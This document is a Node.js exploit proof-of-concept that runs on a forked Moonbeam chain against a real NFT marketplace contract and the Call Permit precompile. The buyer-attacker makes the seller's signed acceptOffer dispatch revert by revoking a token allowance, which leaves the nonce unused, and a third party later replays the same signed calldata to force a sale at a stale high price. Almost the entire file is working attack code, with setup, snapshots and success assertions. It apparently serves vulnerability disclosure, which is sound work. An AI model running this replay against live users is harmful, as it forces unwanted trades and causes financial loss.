const { ApiPromise, WsProvider } = require('@polkadot/api');
const { ethers } = require('ethers');
const fs = require('fs');

const WS = process.env.CHOPSTICKS_WS || 'ws://127.0.0.1:8012';

const CALL_PERMIT = '0x000000000000000000000000000000000000080a';
const MARKETPLACE = '0x683724817a7d526d6256Aec0D6f8ddF541b924de';
const WGLMR = '0xAcc15dC74880C9944775448304B263D191c6077F';
const COLLECTION = '0x104b904e19fBDa76bb864731A2C9E01E6b41f855'; // EXRGameAsset, verified ERC721
const TOKEN_ID = 1549n;

const SELLER_PK = '0x4f3edf983ac636a65a842ce7c78d9aa706d3b113bce036f41c7a0049b1f0f9f2';
const BUYER_PK = '0x6c8759f02b1c63628923e93e8e3e669c65d78b91607b2d87086d87c0e2f92655';
const FIRST_DISPATCHER_PK = '0x59c6995e998f97a5a0044966f094538b85957f5e66ea0d824a528e118d5f43a0';
const REPLAY_DISPATCHER_PK = '0x8b3a350cf5c34c9194ca3a545d69375b8c4b8060b6d578c37ed773f6b4d0bfe7';
const ADMIN_PK = '0xdbda1821b80551c95e00c373828cae4ac7af2a2a5ddc65076d64ff3c0e65f7a8';

const FUND = 10n ** 22n;
const STALE_HIGH_PRICE = 100n * 10n ** 18n;
const ASSUMED_LATER_FLOOR = 60n * 10n ** 18n;

const CP = new ethers.Interface([
  'function dispatch(address from,address to,uint256 value,bytes data,uint64 gaslimit,uint256 deadline,uint8 v,bytes32 r,bytes32 s)',
  'function nonces(address owner) view returns(uint256)',
]);
const MP = new ethers.Interface([
  'function owner() view returns(address)',
  'function TOKEN() view returns(address)',
  'function feesOn() view returns(bool)',
  'function setFeesOn(bool _value)',
  'function setDevFee(uint256 fee)',
  'function setBeanieHolderFee(uint256 fee)',
  'function setBeanBuyBackFee(uint256 fee)',
  'function setDefaultCollectionOwnerFee(uint256 fee)',
  'function setCollectionOwnerFee(address ca,uint256 fee)',
  'function setCollectionTrading(address ca,bool value)',
  'function makeOffer(address ca,uint256 tokenId,uint256 price)',
  'function acceptOffer(address ca,uint256 tokenId,uint256 price,address from,bool escrowedBid)',
  'function getOffers(address ca,uint256 tokenId) view returns(tuple(uint256 price,uint256 timestamp,bool accepted,address buyer,bool escrowed)[])',
]);
const WETH = new ethers.Interface([
  'function deposit() payable',
  'function approve(address guy,uint256 wad) returns(bool)',
  'function balanceOf(address account) view returns(uint256)',
  'function allowance(address owner,address spender) view returns(uint256)',
]);
const ERC721 = new ethers.Interface([
  'function ownerOf(uint256 tokenId) view returns(address)',
  'function balanceOf(address owner) view returns(uint256)',
  'function setApprovalForAll(address operator,bool approved)',
  'function isApprovedForAll(address owner,address operator) view returns(bool)',
]);

function u256(n) {
  return '0x' + BigInt(n).toString(16).padStart(64, '0');
}
function addressWord(addr) {
  return '0x' + '0'.repeat(24) + addr.slice(2).toLowerCase();
}
function mappingSlotUintAddress(key, slot) {
  return ethers.keccak256(ethers.AbiCoder.defaultAbiCoder().encode(['uint256', 'uint256'], [key, slot]));
}
function mappingSlotAddressUint(addr, slot) {
  return ethers.keccak256(ethers.AbiCoder.defaultAbiCoder().encode(['address', 'uint256'], [addr, slot]));
}
function rawLegacyV(raw) {
  return BigInt(ethers.decodeRlp(raw)[6]).toString();
}
function decodeRevertHex(hex) {
  if (!hex || hex === '0x') return '';
  if (hex.startsWith('0x08c379a0')) {
    try {
      return ethers.AbiCoder.defaultAbiCoder().decode(['string'], '0x' + hex.slice(10 + 64))[0];
    } catch (_) {
      return hex;
    }
  }
  return hex;
}
function executedSummary(txResult) {
  return txResult.executed.map((e) => {
    const data = e.human?.data || {};
    return {
      from: data.from,
      to: data.to,
      transactionHash: data.transactionHash,
      exitReason: data.exitReason,
      extraData: data.extraData,
      decodedRevert: decodeRevertHex(data.extraData),
    };
  });
}

async function evmCall(api, from, to, data, value = 0n, gas = 10000000) {
  const result = await api.call.ethereumRuntimeRPCApi.call(from, to, data, value, gas, null, null, null, false, null, null);
  const json = result.toJSON();
  if (!json.ok) throw new Error(JSON.stringify(json));
  return {
    exitReason: json.ok.exitReason,
    value: json.ok.value,
    usedGas: BigInt(json.ok.usedGas.standard).toString(),
    logs: json.ok.logs,
  };
}
async function decodeCall(api, to, iface, fn, args = [], from = ethers.ZeroAddress) {
  const out = await evmCall(api, from, to, iface.encodeFunctionData(fn, args));
  return iface.decodeFunctionResult(fn, out.value);
}
async function nonce(api, addr) {
  return (await decodeCall(api, CALL_PERMIT, CP, 'nonces', [addr]))[0];
}
async function accountBasic(api, addr) {
  const v = await api.call.ethereumRuntimeRPCApi.accountBasic(addr);
  const j = v.toJSON();
  return { balance: BigInt(j.balance), nonce: BigInt(j.nonce) };
}
async function fund(provider, addr, amount = FUND) {
  await provider.send('dev_setStorage', [{
    System: {
      Account: [[[addr], {
        nonce: 0,
        consumers: 0,
        providers: 1,
        sufficients: 0,
        data: { free: amount.toString(), reserved: 0, frozen: 0, flags: 0 },
      }]],
    },
  }]);
}
async function setEvmStorage(provider, contract, slot, value) {
  await provider.send('dev_setStorage', [{ EVM: { AccountStorages: [[[contract, slot], value]] } }]);
}
async function sendLegacy(api, wallet, to, data, gasLimit = 5000000n, value = 0n) {
  const basic = await accountBasic(api, wallet.address);
  const raw = await wallet.signTransaction({
    to,
    data,
    nonce: basic.nonce,
    gasPrice: 125000000000n,
    gasLimit,
    value,
    chainId: 1284,
    type: 0,
  });
  const parsed = ethers.Transaction.from(raw);
  const ethTx = {
    Legacy: {
      nonce: parsed.nonce,
      gasPrice: parsed.gasPrice.toString(),
      gasLimit: parsed.gasLimit.toString(),
      action: { Call: parsed.to },
      value: parsed.value.toString(),
      input: parsed.data,
      signature: { v: rawLegacyV(raw), r: parsed.signature.r, s: parsed.signature.s },
    },
  };

  const events = [];
  const statusInfo = await new Promise((resolve, reject) => {
    let unsub;
    api.tx.ethereum.transact(ethTx).send((result) => {
      if (result.dispatchError) reject(new Error(result.dispatchError.toString()));
      if (result.status.isInBlock || result.status.isFinalized) {
        for (const { event } of result.events) {
          events.push({ section: event.section, method: event.method, data: event.data.toString(), human: event.toHuman() });
        }
        resolve({ status: result.status.type, blockHash: result.status.asInBlock?.toHex?.() || result.status.toString() });
        if (unsub) unsub();
      }
    }).then((u) => { unsub = u; }).catch(reject);
  });
  const executed = events.filter((e) => e.section === 'ethereum' && e.method === 'Executed');
  return { raw, hash: ethers.keccak256(raw), dataHash: ethers.keccak256(parsed.data), statusInfo, executed, events };
}
async function signDispatch(signer, message) {
  const domain = {
    name: 'Call Permit Precompile',
    version: '1',
    chainId: 1284,
    verifyingContract: CALL_PERMIT,
  };
  const types = {
    CallPermit: [
      { name: 'from', type: 'address' },
      { name: 'to', type: 'address' },
      { name: 'value', type: 'uint256' },
      { name: 'data', type: 'bytes' },
      { name: 'gaslimit', type: 'uint64' },
      { name: 'nonce', type: 'uint256' },
      { name: 'deadline', type: 'uint256' },
    ],
  };
  const sig = ethers.Signature.from(await signer.signTypedData(domain, types, message));
  const dispatchCalldata = CP.encodeFunctionData('dispatch', [
    message.from,
    message.to,
    message.value,
    message.data,
    message.gaslimit,
    message.deadline,
    sig.v,
    sig.r,
    sig.s,
  ]);
  return { sig, dispatchCalldata };
}
async function snapshot(api, label, seller, buyer) {
  const [sellerWglmr, buyerWglmr, sellerAllowance, buyerAllowance, owner, sellerNftBal, buyerNftBal, sellerApproved, cpNonce, feesOn] = await Promise.all([
    decodeCall(api, WGLMR, WETH, 'balanceOf', [seller.address]).then((r) => r[0]),
    decodeCall(api, WGLMR, WETH, 'balanceOf', [buyer.address]).then((r) => r[0]),
    decodeCall(api, WGLMR, WETH, 'allowance', [seller.address, MARKETPLACE]).then((r) => r[0]),
    decodeCall(api, WGLMR, WETH, 'allowance', [buyer.address, MARKETPLACE]).then((r) => r[0]),
    decodeCall(api, COLLECTION, ERC721, 'ownerOf', [TOKEN_ID]).then((r) => r[0]),
    decodeCall(api, COLLECTION, ERC721, 'balanceOf', [seller.address]).then((r) => r[0]),
    decodeCall(api, COLLECTION, ERC721, 'balanceOf', [buyer.address]).then((r) => r[0]),
    decodeCall(api, COLLECTION, ERC721, 'isApprovedForAll', [seller.address, MARKETPLACE]).then((r) => r[0]),
    nonce(api, seller.address),
    decodeCall(api, MARKETPLACE, MP, 'feesOn').then((r) => r[0]),
  ]);
  const offers = await decodeCall(api, MARKETPLACE, MP, 'getOffers', [COLLECTION, TOKEN_ID]).then((r) => r[0]);
  return {
    label,
    block: (await api.query.system.number()).toString(),
    timestampMs: (await api.query.timestamp.now()).toString(),
    callPermitNonce: cpNonce.toString(),
    nftOwner: owner,
    sellerNftBalance: sellerNftBal.toString(),
    buyerNftBalance: buyerNftBal.toString(),
    sellerApprovedForMarketplace: sellerApproved,
    sellerWglmrBalance: sellerWglmr.toString(),
    buyerWglmrBalance: buyerWglmr.toString(),
    sellerMarketplaceAllowance: sellerAllowance.toString(),
    buyerMarketplaceAllowance: buyerAllowance.toString(),
    marketplaceFeesOn: feesOn,
    offers: offers.map((o) => ({
      price: o.price.toString(),
      timestamp: o.timestamp.toString(),
      accepted: o.accepted,
      buyer: o.buyer,
      escrowed: o.escrowed,
    })),
  };
}

async function main() {
  const provider = new WsProvider(WS);
  const api = await ApiPromise.create({ provider, noInitWarn: true });

  const seller = new ethers.Wallet(SELLER_PK);
  const buyer = new ethers.Wallet(BUYER_PK);
  const firstDispatcher = new ethers.Wallet(FIRST_DISPATCHER_PK);
  const replayDispatcher = new ethers.Wallet(REPLAY_DISPATCHER_PK);
  const admin = new ethers.Wallet(ADMIN_PK);

  const all = [seller, buyer, firstDispatcher, replayDispatcher, admin].map((w) => w.address.toLowerCase());
  if (new Set(all).size !== all.length) throw new Error('test accounts must be distinct');

  for (const w of [seller, buyer, firstDispatcher, replayDispatcher, admin]) {
    await fund(provider, w.address);
  }

  // Fork preparation only: keep all protocol code real, but make test accounts own/admin the needed live state.
  await setEvmStorage(provider, MARKETPLACE, u256(1), addressWord(admin.address)); // OwnableUpgradeable._owner
  await setEvmStorage(provider, COLLECTION, mappingSlotUintAddress(TOKEN_ID, 2), addressWord(seller.address)); // ERC721._owners[tokenId]
  await setEvmStorage(provider, COLLECTION, mappingSlotAddressUint(seller.address, 3), u256(1)); // ERC721._balances[seller]

  const marketOwner = (await decodeCall(api, MARKETPLACE, MP, 'owner'))[0];
  if (marketOwner.toLowerCase() !== admin.address.toLowerCase()) {
    throw new Error(`marketplace owner patch failed: ${marketOwner}`);
  }
  const token = (await decodeCall(api, MARKETPLACE, MP, 'TOKEN'))[0];
  if (token.toLowerCase() !== WGLMR.toLowerCase()) throw new Error(`unexpected payment token: ${token}`);

  await sendLegacy(api, admin, MARKETPLACE, MP.encodeFunctionData('setFeesOn', [false]), 300000n);
  await sendLegacy(api, admin, MARKETPLACE, MP.encodeFunctionData('setDevFee', [0]), 300000n);
  await sendLegacy(api, admin, MARKETPLACE, MP.encodeFunctionData('setBeanieHolderFee', [0]), 300000n);
  await sendLegacy(api, admin, MARKETPLACE, MP.encodeFunctionData('setBeanBuyBackFee', [0]), 300000n);
  await sendLegacy(api, admin, MARKETPLACE, MP.encodeFunctionData('setDefaultCollectionOwnerFee', [0]), 300000n);
  await sendLegacy(api, admin, MARKETPLACE, MP.encodeFunctionData('setCollectionOwnerFee', [COLLECTION, 0]), 300000n);
  const enableCollection = await sendLegacy(api, admin, MARKETPLACE, MP.encodeFunctionData('setCollectionTrading', [COLLECTION, true]), 300000n);

  await sendLegacy(api, seller, WGLMR, WETH.encodeFunctionData('deposit'), 200000n, STALE_HIGH_PRICE);
  await sendLegacy(api, buyer, WGLMR, WETH.encodeFunctionData('deposit'), 200000n, STALE_HIGH_PRICE);
  await sendLegacy(api, buyer, WGLMR, WETH.encodeFunctionData('approve', [MARKETPLACE, STALE_HIGH_PRICE]), 200000n);
  await sendLegacy(api, seller, COLLECTION, ERC721.encodeFunctionData('setApprovalForAll', [MARKETPLACE, true]), 300000n);

  const beforeOffer = await snapshot(api, 'before real non-escrowed offer', seller, buyer);
  const makeOffer = await sendLegacy(api, buyer, MARKETPLACE, MP.encodeFunctionData('makeOffer', [COLLECTION, TOKEN_ID, STALE_HIGH_PRICE]), 800000n);
  const afterOffer = await snapshot(api, 'after buyer creates non-escrowed offer', seller, buyer);

  const nowSeconds = Math.floor(Number(afterOffer.timestampMs) / 1000);
  const deadline = BigInt(nowSeconds + 3600);
  const acceptOfferData = MP.encodeFunctionData('acceptOffer', [COLLECTION, TOKEN_ID, STALE_HIGH_PRICE, buyer.address, false]);
  const message = {
    from: seller.address,
    to: MARKETPLACE,
    value: 0n,
    data: acceptOfferData,
    gaslimit: 5000000n,
    nonce: 0n,
    deadline,
  };
  const { sig, dispatchCalldata } = await signDispatch(seller, message);
  const dispatchCalldataHash = ethers.keccak256(dispatchCalldata);

  const removeAllowance = await sendLegacy(api, buyer, WGLMR, WETH.encodeFunctionData('approve', [MARKETPLACE, 0]), 200000n);
  const beforeFailedDispatch = await snapshot(api, 'after buyer removes allowance / before failed dispatch', seller, buyer);
  const failedDispatch = await sendLegacy(api, firstDispatcher, CALL_PERMIT, dispatchCalldata, 5200000n);
  const afterFailedDispatch = await snapshot(api, 'after failed valid-permit dispatch', seller, buyer);

  const restoreAllowance = await sendLegacy(api, buyer, WGLMR, WETH.encodeFunctionData('approve', [MARKETPLACE, STALE_HIGH_PRICE]), 200000n);
  const beforeReplay = await snapshot(api, 'after buyer restores allowance / before replay', seller, buyer);
  const replay = await sendLegacy(api, replayDispatcher, CALL_PERMIT, dispatchCalldata, 5200000n);
  const afterReplay = await snapshot(api, 'after exact calldata replay succeeds', seller, buyer);

  const failedSummary = executedSummary(failedDispatch);
  const replaySummary = executedSummary(replay);

  const sellerPayment = BigInt(afterReplay.sellerWglmrBalance) - BigInt(beforeReplay.sellerWglmrBalance);
  const buyerPayment = BigInt(beforeReplay.buyerWglmrBalance) - BigInt(afterReplay.buyerWglmrBalance);

  const ok =
    afterFailedDispatch.callPermitNonce === beforeFailedDispatch.callPermitNonce &&
    beforeFailedDispatch.callPermitNonce === '0' &&
    afterReplay.callPermitNonce === '1' &&
    afterReplay.nftOwner.toLowerCase() === buyer.address.toLowerCase() &&
    beforeReplay.nftOwner.toLowerCase() === seller.address.toLowerCase() &&
    failedDispatch.dataHash === replay.dataHash &&
    sellerPayment === STALE_HIGH_PRICE &&
    buyerPayment === STALE_HIGH_PRICE &&
    replayDispatcher.address.toLowerCase() !== seller.address.toLowerCase() &&
    replayDispatcher.address.toLowerCase() !== buyer.address.toLowerCase();

  const result = {
    result: ok ? 'STALE_ACCEPT_OFFER_REPLAY_SUCCEEDED' : 'STALE_ACCEPT_OFFER_REPLAY_FAILED',
    accounts: {
      seller: seller.address,
      buyerAttacker: buyer.address,
      firstDispatcher: firstDispatcher.address,
      replayDispatcher: replayDispatcher.address,
      replayDispatcherUnrelatedToSellerAndBuyer:
        replayDispatcher.address.toLowerCase() !== seller.address.toLowerCase() &&
        replayDispatcher.address.toLowerCase() !== buyer.address.toLowerCase(),
      forkAdmin: admin.address,
    },
    contracts: {
      callPermit: CALL_PERMIT,
      marketplaceV9: MARKETPLACE,
      paymentToken: WGLMR,
      erc721Collection: COLLECTION,
      tokenId: TOKEN_ID.toString(),
    },
    forkPreparation: {
      noMockSolidityContracts: true,
      marketplaceOwnerPatchedOnlyToDisableFeesAndEnableCollection: true,
      erc721OwnerStoragePatchedToSellerForExistingTokenId: true,
      marketplaceOwnerAfterPatch: marketOwner,
      setCollectionTradingTx: {
        txHash: enableCollection.hash,
        ethereumExecuted: executedSummary(enableCollection),
      },
    },
    signedAction: {
      function: 'acceptOffer(address,uint256,uint256,address,bool)',
      args: {
        ca: COLLECTION,
        tokenId: TOKEN_ID.toString(),
        price: STALE_HIGH_PRICE.toString(),
        from: buyer.address,
        escrowedBid: false,
      },
      assumedLaterFloorForStalePriceNarrative: ASSUMED_LATER_FLOOR.toString(),
      calldata: acceptOfferData,
      calldataHash: ethers.keccak256(acceptOfferData),
      fixedInCalldata: ['collection', 'tokenId', 'staleHighPrice', 'buyer/from', 'escrowedBid=false'],
    },
    callPermit: {
      signedNonce: message.nonce.toString(),
      deadline: message.deadline.toString(),
      gaslimit: message.gaslimit.toString(),
      dispatchCalldata,
      dispatchCalldataHash,
      v: sig.v,
      r: sig.r,
      s: sig.s,
    },
    setupTxs: {
      makeOffer: { txHash: makeOffer.hash, ethereumExecuted: executedSummary(makeOffer) },
      buyerRemoveAllowance: { txHash: removeAllowance.hash, ethereumExecuted: executedSummary(removeAllowance) },
      buyerRestoreAllowance: { txHash: restoreAllowance.hash, ethereumExecuted: executedSummary(restoreAllowance) },
    },
    failedPublish: {
      reason: 'buyer-attacker set WGLMR allowance to zero, causing acceptOffer -> tokenPurchase to revert inside target',
      expectedTargetRevert: 'Marketplace not approved to spend buyer tokens.',
      txHash: failedDispatch.hash,
      txInputHash: failedDispatch.dataHash,
      exactPublishedCalldataHash: dispatchCalldataHash,
      ethereumExecuted: failedSummary,
      nonceBefore: beforeFailedDispatch.callPermitNonce,
      nonceAfter: afterFailedDispatch.callPermitNonce,
      buyerAllowanceBefore: beforeFailedDispatch.buyerMarketplaceAllowance,
      buyerAllowanceAfter: afterFailedDispatch.buyerMarketplaceAllowance,
    },
    replay: {
      txHash: replay.hash,
      txInputHash: replay.dataHash,
      exactSameDispatchCalldataReused: failedDispatch.dataHash === replay.dataHash,
      replayDispatcher: replayDispatcher.address,
      ethereumExecuted: replaySummary,
      nonceBefore: beforeReplay.callPermitNonce,
      nonceAfter: afterReplay.callPermitNonce,
      buyerAllowanceBefore: beforeReplay.buyerMarketplaceAllowance,
      buyerAllowanceAfter: afterReplay.buyerMarketplaceAllowance,
      nftOwnerBefore: beforeReplay.nftOwner,
      nftOwnerAfter: afterReplay.nftOwner,
      sellerPaymentAmount: sellerPayment.toString(),
      buyerPaymentAmount: buyerPayment.toString(),
    },
    snapshots: {
      beforeOffer,
      afterOffer,
      beforeFailedDispatch,
      afterFailedDispatch,
      beforeReplay,
      afterReplay,
    },
    assertions: {
      A_acceptOfferFixesStalePriceInCalldata: acceptOfferData.includes(STALE_HIGH_PRICE.toString(16).padStart(64, '0')),
      B_buyerControlsRevertCondition: beforeFailedDispatch.buyerMarketplaceAllowance === '0',
      C_failedDispatchLeaksReusableSignature: failedDispatch.dataHash === dispatchCalldataHash && failedSummary.length > 0,
      D_exactSameCalldataReusableLater: failedDispatch.dataHash === replay.dataHash,
      E_unrelatedReplayDispatcherWorks:
        replayDispatcher.address.toLowerCase() !== seller.address.toLowerCase() &&
        replayDispatcher.address.toLowerCase() !== buyer.address.toLowerCase() &&
        replaySummary.some((e) => e.exitReason?.Succeed === 'Returned'),
      F_staleOrderExecutesLater: afterReplay.nftOwner.toLowerCase() === buyer.address.toLowerCase(),
      G_nonceUnchangedAfterFailedDispatch: afterFailedDispatch.callPermitNonce === beforeFailedDispatch.callPermitNonce,
      H_nonceConsumedOnlyAfterSuccessfulReplay: beforeReplay.callPermitNonce === '0' && afterReplay.callPermitNonce === '1',
    },
  };

  const json = JSON.stringify(result, null, 2);
  if (process.env.RESULT_PATH) {
    fs.writeFileSync(process.env.RESULT_PATH, json, { encoding: 'utf8' });
  }
  console.log(json);
  await api.disconnect();

  if (!ok) process.exitCode = 1;
}

main().catch((err) => {
  console.error(err);
  process.exit(1);
});
